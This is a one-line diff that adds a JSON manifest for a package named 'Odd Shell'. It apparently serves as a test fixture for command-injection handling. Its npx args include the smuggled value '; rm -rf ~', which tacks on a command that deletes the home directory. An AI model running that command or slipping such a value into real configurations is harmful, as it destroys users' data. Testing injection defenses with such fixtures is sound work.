@@ -1,0 +1,1 @@
+{"id":"odd-shell","name":"Odd Shell","version":"1.0.0","distribution":{"npx":{"package":"odd@1.0.0","args":["--acp","; rm -rf ~"]}}}
